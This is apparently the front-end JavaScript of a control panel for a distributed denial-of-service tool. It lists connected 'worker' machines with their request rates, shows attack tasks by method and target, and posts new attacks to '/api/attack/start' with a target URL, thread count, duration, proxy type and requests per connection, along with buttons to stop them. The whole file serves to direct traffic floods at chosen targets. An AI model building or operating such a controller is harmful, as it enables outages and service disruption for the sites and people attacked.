let toastTimer = null

const $ = id => document.getElementById(id)
const $$ = sel => document.querySelectorAll(sel)

function showToast(msg, type='success') {
  const t = $('toast')
  t.textContent = msg
  t.className = `toast ${type} show`
  clearTimeout(toastTimer)
  toastTimer = setTimeout(() => t.classList.remove('show'), 3000)
}

function formatNum(n) { return Number(n).toLocaleString() }

function workerCard(id, w) {
  const s = w.stats || {}
  const running = s.running || false
  const cpu = parseFloat(s.cpu) || 0
  const mem = parseFloat(s.memory) || 0
  const reqs = s.requests || 0
  const rate = s.rate || 0
  const online = w.online || false
  const taskId = w.current_task || '-'
  const ci = w.cpu_info || {}

  return `<div class="worker-card ${online ? 'online' : ''}">
    <div class="worker-head">
      <span class="worker-dot ${online ? 'on' : ''}"></span>
      <span class="worker-name">${id}</span>
      <span class="worker-model">${ci.model || ''}</span>
    </div>
    <div class="worker-body">
      <div class="worker-stat"><span class="ws-label">Task</span><span class="ws-val">#${taskId}</span></div>
      <div class="worker-stat"><span class="ws-label">Sent</span><span class="ws-val">${formatNum(reqs)}</span></div>
      <div class="worker-stat"><span class="ws-label">Rate</span><span class="ws-val">${formatNum(rate)}/s</span></div>
      <div class="worker-bar"><span class="ws-label">CPU</span><div class="bar-bg"><div class="bar-fill cpu" style="width:${cpu}%"></div></div><span class="ws-val">${cpu.toFixed(1)}%</span></div>
      <div class="worker-bar"><span class="ws-label">Mem</span><div class="bar-bg"><div class="bar-fill mem" style="width:${mem}%"></div></div><span class="ws-val">${mem.toFixed(1)}%</span></div>
    </div>
    <div class="worker-foot">
      ${running ? `<span class="tag running">RUNNING</span>` : `<span class="tag idle">IDLE</span>`}
      ${running ? `<button class="btn-stop" data-worker="${id}">Stop</button>` : ''}
    </div>
  </div>`
}

function updateWorkers(workers) {
  const list = $('workerList')
  const ids = Object.keys(workers)
  $('workerCount').textContent = ids.length + ' worker' + (ids.length !== 1 ? 's' : '')
  if (!ids.length) {
    list.innerHTML = '<div class="worker-empty">No workers connected</div>'
    return
  }
  list.innerHTML = ids.map(id => workerCard(id, workers[id])).join('')

  list.querySelectorAll('.btn-stop').forEach(btn => {
    btn.addEventListener('click', async () => {
      const wid = btn.dataset.worker
      try {
        const r = await fetch(`/api/attack/stop/${wid}`, {method: 'POST'})
        if (r.ok) showToast('Stop sent to ' + wid)
      } catch(e) { showToast('Failed', 'error') }
    })
  })
}

function updateTasks(tasksData) {
  const list = $('taskList'), count = $('taskCount')
  const tasks = tasksData.tasks || []
  count.textContent = tasks.length
  if (!tasks.length) {
    list.innerHTML = '<div class="task-empty">No tasks</div>'
    return
  }
  const colors = {pending:'#f59e0b', running:'#34d399', completed:'#6366f1', stopped:'#ef4444', error:'#ef4444'}
  const reversed = [...tasks].reverse()
  list.innerHTML = reversed.slice(0, 50).map(t => `
    <div class="task-item">
      <span class="task-badge" style="background:${colors[t.status] || '#555'}">${t.status}</span>
      <span class="task-method">${t.method}</span>
      <span class="task-target">${t.target}</span>
      <span class="task-worker">${t.assigned_to || '-'}</span>
      <span class="task-req">${formatNum((t.stats||{}).requests||0)}</span>
    </div>
  `).join('')
}

async function poll() {
  try {
    const r = await fetch('/api/system')
    const data = await r.json()
    updateWorkers(data.workers || {})
    updateTasks(data.tasks || {})
  } catch(e) {}
}

async function pollWorkers() {
  try {
    const r = await fetch('/api/workers')
    const data = await r.json()
    updateWorkers(data)
  } catch(e) {}
}

$('configForm').addEventListener('submit', async e => {
  e.preventDefault()
  const url = $('url').value.trim()
  if (!url) { showToast('Enter target', 'error'); return }
  $('startBtn').disabled = true
  $('startBtn').innerHTML = 'Sending...'
  try {
    const r = await fetch('/api/attack/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        method: $('method').value,
        url,
        threads: parseInt($('threads').value) || 100,
        duration: parseInt($('duration').value) || 60,
        proxy_type: parseInt($('proxyType').value) || 0,
        rpc: parseInt($('rpc').value) || 10,
        assign_to: $('assignTo').value || null,
      })
    })
    const d = await r.json()
    if (r.ok) showToast('Task #' + d.task.id + ' created')
    else showToast(d.error || 'Failed', 'error')
  } catch(e) { showToast('Error', 'error') }
  $('startBtn').innerHTML = 'Send Task'
  $('startBtn').disabled = false
})

$('logoutBtn').addEventListener('click', async () => {
  await fetch('/api/logout', {method: 'POST'})
  window.location.href = '/login'
})

setInterval(poll, 2000)
setInterval(pollWorkers, 5000)
poll()
